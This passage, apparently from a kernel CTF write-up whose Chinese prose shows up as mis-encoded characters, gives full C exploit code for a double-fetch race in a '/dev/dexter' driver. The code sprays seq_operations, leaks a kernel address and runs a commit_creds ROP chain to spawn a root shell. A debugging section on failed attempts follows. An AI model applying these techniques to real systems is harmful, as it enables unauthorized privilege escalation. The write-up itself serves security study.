keyword">struct</span><span class="token punctuation">&#123;</span><span class="token keyword">char</span> <span class="token operator">*</span>ptr<span class="token punctuation">;</span><span class="token class-name">size_t</span> len<span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token class-name">request_t</span><span class="token punctuation">;</span><span class="token keyword">int</span> win<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">;</span><span class="token keyword">int</span> fd<span class="token punctuation">;</span><span class="token class-name">request_t</span> req<span class="token punctuation">;</span><span class="token keyword">void</span> <span class="token function">dexter_read</span><span class="token punctuation">(</span><span class="token keyword">char</span> <span class="token operator">*</span>buf<span class="token punctuation">,</span> <span class="token class-name">size_t</span> size<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>req<span class="token punctuation">.</span>ptr<span class="token operator">=</span>buf<span class="token punctuation">;</span>req<span class="token punctuation">.</span>len<span class="token operator">=</span>size<span class="token punctuation">;</span><span class="token function">ioctl</span><span class="token punctuation">(</span>fd<span class="token punctuation">,</span> <span class="token number">0xdec50001</span><span class="token punctuation">,</span> <span class="token operator">&amp;</span>req<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">void</span> <span class="token function">dexter_write</span><span class="token punctuation">(</span><span class="token keyword">char</span> <span class="token operator">*</span>buf<span class="token punctuation">,</span> <span class="token class-name">size_t</span> size<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>req<span class="token punctuation">.</span>ptr<span class="token operator">=</span>buf<span class="token punctuation">;</span>req<span class="token punctuation">.</span>len<span class="token operator">=</span>size<span class="token punctuation">;</span><span class="token function">ioctl</span><span class="token punctuation">(</span>fd<span class="token punctuation">,</span> <span class="token number">0xdec50002</span><span class="token punctuation">,</span> <span class="token operator">&amp;</span>req<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">void</span> <span class="token operator">*</span><span class="token function">race</span><span class="token punctuation">(</span><span class="token keyword">void</span> <span class="token operator">*</span>size<span class="token punctuation">)</span><span class="token punctuation">&#123;</span><span class="token keyword">while</span> <span class="token punctuation">(</span><span class="token operator">!</span>win<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>req<span class="token punctuation">.</span>len<span class="token operator">=</span><span class="token punctuation">(</span><span class="token class-name">size_t</span><span class="token punctuation">)</span>size<span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token keyword">int</span> <span class="token function">compete_read</span><span class="token punctuation">(</span><span class="token keyword">char</span> <span class="token operator">*</span>buf<span class="token punctuation">,</span> <span class="token class-name">size_t</span> size<span class="token punctuation">)</span><span class="token punctuation">&#123;</span><span class="token class-name">pthread_t</span> compete_id<span class="token punctuation">;</span><span class="token function">pthread_create</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>compete_id<span class="token punctuation">,</span> <span class="token constant">NULL</span><span class="token punctuation">,</span> race<span class="token punctuation">,</span> <span class="token punctuation">(</span><span class="token keyword">void</span><span class="token operator">*</span><span class="token punctuation">)</span>size<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">while</span> <span class="token punctuation">(</span><span class="token operator">!</span>win<span class="token punctuation">)</span><span class="token punctuation">&#123;</span><span class="token function">dexter_read</span><span class="token punctuation">(</span>buf<span class="token punctuation">,</span> <span class="token number">0x20</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token class-name">size_t</span> leak<span class="token operator">=</span><span class="token operator">*</span><span class="token punctuation">(</span><span class="token class-name">size_t</span> <span class="token operator">*</span><span class="token punctuation">)</span><span class="token punctuation">(</span>buf<span class="token operator">+</span><span class="token number">0x20</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token punctuation">(</span>leak<span class="token operator">&amp;</span><span class="token number">0xffff000000000000</span><span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token number">0xffff000000000000</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span><span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"[*] compete_read Finished\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>win<span class="token operator">=</span><span class="token number">1</span><span class="token punctuation">;</span><span class="token keyword">break</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token function">pthread_join</span><span class="token punctuation">(</span>compete_id<span class="token punctuation">,</span><span class="token constant">NULL</span><span class="token punctuation">)</span><span class="token punctuation">;</span>win<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">int</span> <span class="token function">compete_write</span><span class="token punctuation">(</span><span class="token keyword">char</span> <span class="token operator">*</span>buf<span class="token punctuation">,</span> <span class="token class-name">size_t</span> size<span class="token punctuation">)</span><span class="token punctuation">&#123;</span><span class="token class-name">pthread_t</span> compete_id<span class="token punctuation">;</span><span class="token function">pthread_create</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>compete_id<span class="token punctuation">,</span> <span class="token constant">NULL</span><span class="token punctuation">,</span> race<span class="token punctuation">,</span> <span class="token punctuation">(</span><span class="token keyword">void</span><span class="token operator">*</span><span class="token punctuation">)</span>size<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">for</span><span class="token punctuation">(</span><span class="token keyword">int</span> i<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">;</span> i<span class="token operator">&lt;</span><span class="token number">0x10000</span><span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span><span class="token function">dexter_write</span><span class="token punctuation">(</span>buf<span class="token punctuation">,</span> <span class="token number">0x20</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token comment">//pthread_join(compete_id,NULL);</span>win<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">int</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token keyword">int</span> argc<span class="token punctuation">,</span> <span class="token keyword">char</span> <span class="token operator">*</span>argv<span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token keyword">char</span> <span class="token operator">*</span>envp<span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span><span class="token function">saveStatus</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//spray</span><span class="token keyword">int</span> p<span class="token punctuation">[</span><span class="token number">100</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> i<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">;</span> i<span class="token operator">&lt;</span><span class="token number">50</span><span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>p<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token operator">=</span><span class="token function">open</span><span class="token punctuation">(</span><span class="token string">"/proc/self/stat"</span><span class="token punctuation">,</span> O_RDWR<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"[*] Spary 50 seq_operations"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>fd<span class="token operator">=</span><span class="token function">open</span><span class="token punctuation">(</span><span class="token string">"/dev/dexter"</span><span class="token punctuation">,</span>O_RDWR<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">if</span> <span class="token punctuation">(</span>fd<span class="token operator">></span><span class="token number">0</span><span class="token punctuation">)</span> <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"[+] /dev/dexter Opened"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> i<span class="token operator">=</span><span class="token number">50</span><span class="token punctuation">;</span> i<span class="token operator">&lt;</span><span class="token number">100</span><span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>p<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token operator">=</span><span class="token function">open</span><span class="token punctuation">(</span><span class="token string">"/proc/self/stat"</span><span class="token punctuation">,</span> O_RDWR<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"[*] Spary 50 seq_operations"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//leak</span><span class="token keyword">char</span> buf<span class="token punctuation">[</span><span class="token number">0x100</span><span class="token punctuation">]</span><span class="token operator">=</span><span class="token punctuation">&#123;</span><span class="token punctuation">&#125;</span><span class="token punctuation">;</span><span class="token function">compete_read</span><span class="token punctuation">(</span>buf<span class="token punctuation">,</span> <span class="token number">0x100</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token class-name">size_t</span> seq_start<span class="token operator">=</span><span class="token operator">*</span><span class="token punctuation">(</span><span class="token class-name">size_t</span> <span class="token operator">*</span><span class="token punctuation">)</span><span class="token operator">&amp;</span>buf<span class="token punctuation">[</span><span class="token number">0x20</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token class-name">size_t</span> koff<span class="token operator">=</span>seq_start<span class="token operator">-</span><span class="token number">0xffffffff81000000</span><span class="token operator">-</span><span class="token number">0x170f80</span><span class="token punctuation">;</span><span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"[*] seq_start=>0x%lx\n"</span><span class="token punctuation">,</span> seq_start<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"[*] koff=>0x%lx\n"</span><span class="token punctuation">,</span> koff<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">char</span> <span class="token operator">*</span>userland<span class="token operator">=</span><span class="token function">mmap</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token keyword">void</span> <span class="token operator">*</span><span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token number">0x39000000</span><span class="token operator">-</span><span class="token number">0x4000</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token number">0x5000</span><span class="token punctuation">,</span> PROT_READ <span class="token operator">|</span> PROT_WRITE <span class="token operator">|</span> PROT_EXEC<span class="token punctuation">,</span> MAP_PRIVATE <span class="token operator">|</span> MAP_ANONYMOUS <span class="token operator">|</span> MAP_POPULATE<span class="token punctuation">,</span> <span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token class-name">size_t</span> ropchain<span class="token punctuation">[</span><span class="token number">0x40</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token keyword">int</span> i<span class="token punctuation">;</span>ropchain<span class="token punctuation">[</span>i<span class="token operator">++</span><span class="token punctuation">]</span><span class="token operator">=</span>POP_RDI_RET<span class="token punctuation">;</span>ropchain<span class="token punctuation">[</span>i<span class="token operator">++</span><span class="token punctuation">]</span><span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">;</span>ropchain<span class="token punctuation">[</span>i<span class="token operator">++</span><span class="token punctuation">]</span><span class="token operator">=</span>prepare_kernel_cred_addr<span class="token operator">+</span>koff<span class="token punctuation">;</span>ropchain<span class="token punctuation">[</span>i<span class="token operator">++</span><span class="token punctuation">]</span><span class="token operator">=</span>POP_RCX_RET<span class="token punctuation">;</span>ropchain<span class="token punctuation">[</span>i<span class="token operator">++</span><span class="token punctuation">]</span><span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">;</span>ropchain<span class="token punctuation">[</span>i<span class="token operator">++</span><span class="token punctuation">]</span><span class="token operator">=</span>MOV_RDI_RAX_REP_MOVSQ_RET<span class="token punctuation">;</span>ropchain<span class="token punctuation">[</span>i<span class="token operator">++</span><span class="token punctuation">]</span><span class="token operator">=</span>commit_creds<span class="token operator">+</span>koff<span class="token punctuation">;</span>ropchain<span class="token punctuation">[</span>i<span class="token operator">++</span><span class="token punctuation">]</span><span class="token operator">=</span>swapgs_restore_regs_and_return_to_usermode<span class="token operator">+</span><span class="token number">22</span><span class="token operator">+</span>koff<span class="token punctuation">;</span>ropchain<span class="token punctuation">[</span>i<span class="token operator">++</span><span class="token punctuation">]</span><span class="token operator">=</span><span class="token number">0xdeadbeef</span><span class="token punctuation">;</span>ropchain<span class="token punctuation">[</span>i<span class="token operator">++</span><span class="token punctuation">]</span><span class="token operator">=</span><span class="token number">0xdeadbeef</span><span class="token punctuation">;</span>ropchain<span class="token punctuation">[</span>i<span class="token operator">++</span><span class="token punctuation">]</span><span class="token operator">=</span><span class="token punctuation">(</span><span class="token class-name">size_t</span><span class="token punctuation">)</span><span class="token operator">&amp;</span>getRootShell<span class="token punctuation">;</span>ropchain<span class="token punctuation">[</span>i<span class="token operator">++</span><span class="token punctuation">]</span><span class="token operator">=</span>user_cs<span class="token punctuation">;</span>ropchain<span class="token punctuation">[</span>i<span class="token operator">++</span><span class="token punctuation">]</span><span class="token operator">=</span>user_rflags<span class="token punctuation">;</span>ropchain<span class="token punctuation">[</span>i<span class="token operator">++</span><span class="token punctuation">]</span><span class="token operator">=</span>user_rsp<span class="token punctuation">;</span>ropchain<span class="token punctuation">[</span>i<span class="token operator">++</span><span class="token punctuation">]</span><span class="token operator">=</span>user_ss<span class="token punctuation">;</span><span class="token function">memcpy</span><span class="token punctuation">(</span><span class="token punctuation">(</span>userland<span class="token operator">+</span><span class="token number">0x4000</span><span class="token punctuation">)</span><span class="token punctuation">,</span> ropchain<span class="token punctuation">,</span> <span class="token keyword">sizeof</span><span class="token punctuation">(</span>ropchain<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token operator">*</span><span class="token punctuation">(</span><span class="token class-name">size_t</span> <span class="token operator">*</span><span class="token punctuation">)</span><span class="token operator">&amp;</span>buf<span class="token punctuation">[</span><span class="token number">0x20</span><span class="token punctuation">]</span><span class="token operator">=</span>MOV_ESP_0x39000000_RET<span class="token punctuation">;</span><span class="token function">compete_write</span><span class="token punctuation">(</span>buf<span class="token punctuation">,</span> <span class="token number">0x100</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">for</span><span class="token punctuation">(</span>i<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">;</span> i<span class="token operator">&lt;</span><span class="token number">100</span><span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span><span class="token function">read</span><span class="token punctuation">(</span>p<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token string">"X1NRI"</span><span class="token punctuation">,</span> <span class="token number">5</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><img src="/EXP_FILE/d57055110ac45482ee1e16134f068064_MD5.jpeg"></p><h2 id="å››-ä¸­é—´å‡ºç°çš„é—®é¢˜"><a href="#å››-ä¸­é—´å‡ºç°çš„é—®é¢˜" class="headerlink" title="(å››)ä¸­é—´å‡ºç°çš„é—®é¢˜"></a>(å››)ä¸­é—´å‡ºç°çš„é—®é¢˜</h2><ul><li><p>é—®é¢˜1ã€æˆ‘åœ¨double fetchæ—¶ä¸€ç›´å¤±è´¥ï¼Œå¦‚ä¸‹æ˜¯æˆ‘å½“æ—¶çš„ç«äº‰ç›¸å…³ä»£ç ï¼š</p><pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token keyword">int</span> win<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">;</span><span class="token keyword">typedef</span> <span class="token keyword">struct</span><span class="token punctuation">&#123;</span><span class="token keyword">char</span> <span class="token operator">*</span>ptr<span class="token punctuation">;</span><span class="token class-name">size_t</span> len<span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token class-name">request_t</span><span class="token punctuation">;</span><span class="token keyword">void</span> <span class="token function">dexter_read</span><span class="token punctuation">(</span><span class="token keyword">int</span> fd<span class="token punctuation">,</span> <span class="token class-name">request_t</span> structure<span class="token punctuation">)</span><span class="token punctuation">&#123;</span><span class="token function">ioctl</span><span class="token punctuation">(</span>fd<span class="token punctuation">,</span> <span class="token number">0xdec50001</span><span class="token punctuation">,</span> <span class="token operator">&amp;</span>structure<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">void</span> <span class="token function">dexter_write</span><span class="token punctuation">(</span><span class="token keyword">int</span> fd<span class="token punctuation">,</span> <span class="token class-name">request_t</span> structure<span class="token punctuation">)</span><span class="token punctuation">&#123;</span><span class="token function">ioctl</span><span class="token punctuation">(</span>fd<span class="token punctuation">,</span> <span class="token number">0xdec50002</span><span class="token punctuation">,</span> <span class="token operator">&amp;</span>structure<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">void</span> <span class="token operator">*</span><span class="token function">race</span><span class="token punctuation">(</span><span class="token keyword">int</span> fd<span class="token punctuation">,</span> <span class="token class-name">request_t</span> structure<span class="token punctuation">)</span><span class="token punctuation">&#123;</span><span class="token keyword">while</span> <span class="token punctuation">(</span><span class="token operator">!</span>win<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>structure<span class="token punctuation">.</span>len<span class="token operator">=</span><span class="token number">0x100</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token keyword">int</span> <span class="token function">compete_read</span><span class="token punctuation">(</span><span class="token keyword">int</span> fd<span class="token punctuation">,</span> <span class="token class-name">request_t</span> structure<span class="token punctuation">)</span><span class="token punctuation">&#123;</span><span class="token class-name">pthread_t</span> compete_id<span class="token punctuation">;</span><span class="token function">pthread_create</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>compete_id<span class="token punctuation">,</span> <span class="token constant">NULL</span><span class="token punctuation">,</span> race<span class="token punctuation">,</span> <span class="token operator">&amp;</span>structure<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">int</span> i<span class="token punctuation">;</span><span class="token keyword">int</span> try_times<span class="token operator">=</span><span class="token number">0x10000</span><span class="token punctuation">;</span>  <span class="token keyword">for</span> <span class="token punctuation">(</span>i<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">;</span> i<span class="token operator">&lt;</span>try_times<span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>structure<span class="token punctuation">.</span>len<span class="token operator">=</span><span class="token number">0x20</span><span class="token punctuation">;</span><span class="token function">dexter_read</span><span class="token punctuation">(</span>fd<span class="token punctuation">,</span> structure<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token class-name">size_t</span> leak<span class="token operator">=</span><span class="token operator">*</span><span class="token punctuation">(</span><span class="token class-name">size_t</span> <span class="token operator">*</span><span class="token punctuation">)</span><span class="token punctuation">(</span>structure<span class="token punctuation">.</span>ptr<span class="token operator">+</span><span class="token number">0x20</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">if</span><span class="token punctuation">(</span>leak<span class="token operator">!=</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>win<span class="token operator">=</span><span class="token number">1</span><span class="token punctuation">;</span><span class="token keyword">break</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span>win<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">;</span>              <span class="token function">pthread_join</span><span class="token punctuation">(</span>compete_id<span class="token punctuation">,</span><span class="token constant">NULL</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">int</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token keyword">int</span> argc<span class="token punctuation">,</span> <span class="token keyword">char</span> <span class="token operator">*</span>argv<span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token keyword">char</span> <span class="token operator">*</span>envp<span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span><span class="token function">saveStatus</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//spray</span><span class="token keyword">int</span> p<span class="token punctuation">[</span><span class="token number">100</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> i<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">;</span> i<span class="token operator">&lt;</span><span class="token number">50</span><span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>p<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token operator">=</span><span class="token function">open</span><span class="token punctuation">(</span><span class="token string">"/proc/self/stat"</span><span class="token punctuation">,</span> O_RDWR<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"[*] Spary 50 seq_operations"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">int</span> fd<span class="token operator">=</span><span class="token function">open</span><span class="token punctuation">(</span><span class="token string">"/dev/dexter"</span><span class="token punctuation">,</span>O_RDWR<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">if</span> <span class="token punctuation">(</span>fd<span class="token operator">></span><span class="token number">0</span><span class="token punctuation">)</span> <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"[+] /dev/dexter Opened"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> i<span class="token operator">=</span><span class="token number">50</span><span class="token punctuation">;</span> i<span class="token operator">&lt;</span><span class="token number">100</span><span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>p<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token operator">=</span><span class="token function">open</span><span class="token punctuation">(</span><span class="token string">"/proc/self/stat"</span><span class="token punctuation">,</span> O_RDWR<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"[*] Spary 50 seq_operations"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//leak</span><span class="token keyword">char</span> <span class="token operator">*</span>buf<span class="token operator">=</span><span class="token function">malloc</span><span class="token punctuation">(</span><span class="token number">0x100</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token class-name">request_t</span> content<span class="token punctuation">;</span>content<span class="token punctuation">.</span>ptr<span class="token operator">=</span>buf<span class="token punctuation">;</span><span class="token function">compete_read</span><span class="token punctuation">(</span>fd<span class="token punctuation">,</span> content<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>ç›®å‰é”™è¯¯åŸå› ä¸æ˜</p></li><li><p>é—®é¢˜2ã€å½“æ‰§è¡Œç”¨æˆ·æ€å¸ƒç½®çš„ropchainæ—¶ï¼Œåˆ°<code>prepare_kernel_cred</code>è¿™ä¸ªgadgetæ—¶ä¸€ç›´panicï¼š<code>double_fault</code><br><img src="/EXP_FILE/8135dbdaa9a7a9173f1e98540ad2fcbb_MD5.jpeg"></p></li></ul><p>åæ¥æŸ¥æ˜äº†åŸå› ï¼Œè¿™æ˜¯æˆ‘ä½¿ç”¨çš„mmapä»£ç ï¼š</p><pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token keyword">char</span> <span class="token operator">*</span>userland<span class="token operator">=</span><span class="token function">mmap</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token keyword">void</span> <span class="token operator">*</span><span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token number">0x39000000</span><span class="token operator">-</span><span class="token number">0x4000</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token number">0x5000</span><span class="token punctuation">,</span> PROT_READ <span class="token operator">|</span> PROT_WRITE <span class="token operator">|</span> PROT_EXEC<span class="token punctuation">,</span> MAP_PRIVATE <span class="token operator">|</span> MAP_ANONYMOUS <span class="token punctuation">,</span> <span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>æ­£ç¡®çš„mmapå¦‚ä¸‹ï¼š</p><pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token keyword">char</span> <span class="token operator">*</span>userland<span class="token operator">=</span><span class="token function">mmap</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token keyword">void</span> <span class="token operator">*</span><span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token number">0x39000000</span><span class="token operator">-</span><span class="token number">0x4000</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token number">0x5000</span><span class="token punctuation">,</span> PROT_READ <span class="token operator">|</span> PROT_WRITE <span class="token operator">|</span> PROT_EXEC<span class="token punctuation">,</span> MAP_PRIVATE <span class="token operator">|</span> MAP_ANONYMOUS <span class="token operator">|</span> MAP_POPULATE<span class="token punctuation">,</span> <span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>æ·»åŠ äº†<code>MAP_POPULATE</code>æ ‡å¿—ä½ï¼Œå®ƒçš„æ„æ€æ˜¯å¯¹æ˜ å°„çš„æ–‡ä»¶è¿›è¡Œé¢„è¯»ï¼Œå¹¶ä¸”å»ºç«‹å†…å­˜é¡µè¡¨æ˜ å°„ã€‚ç”¨äºæå‰å°†æ–‡ä»¶å†…å®¹æ˜ å°„åˆ°å†…å­˜åŒºåŸŸã€‚å¦‚æœä¸è®¾ç½®è¯¥æ ‡å¿—ä½ï¼ŒLinuxåœ¨è°ƒç”¨Â <code>mmap</code>Â æ—¶å¹¶ä¸ä¼šç«‹å³ä¸ºè¿›ç¨‹åˆ†é…ç‰©ç†å†…å­˜ç©ºé—´ã€‚åªæœ‰åœ¨çœŸæ­£è®¿é—®åœ°å€ç©ºé—´æ—¶ï¼Œå‘ç°æ•°æ®ä¸å­˜åœ¨äºç‰©ç†å†…å­˜æ—¶ï¼Œæ‰ä¼šè§¦å‘ç¼ºé¡µä¸­æ–­ï¼Œå°†ç¼ºå¤±çš„é¡µæ¢å…¥å†…å­˜ç©ºé—´ã€‚ä½†å¦‚æœè®¾ç½®äº†Â <code>MAP_POPULATE</code>ï¼Œåˆ™ä¼šé¢„å…ˆå°†æ–‡ä»¶å†…å®¹åŠ è½½åˆ°æ˜ å°„åŒºåŸŸï¼Œé¿å…äº†åç»­çš„ç¼ºé¡µä¸­æ–­ã€‚</p><ul><li>é—®é¢˜3ã€åœ¨rootæƒé™ä¸‹æˆ‘çš„expæˆåŠŸäº†ï¼Œä½†åœ¨érootæƒé™ä¸‹å‡ºç°å†…æ ¸ææ…Œ</li></ul><p>åŸå› æ˜¯åœ¨å †å–·seq_operationsç»“æ„ä½“æ—¶ï¼Œæ˜¯ä»¥è¯»å†™æ‰“å¼€çš„è®¾å¤‡ï¼š</p><pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> i<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">;</span> i<span class="token operator">&lt;</span><span class="token number">100</span><span class="token punctuation">;</span> 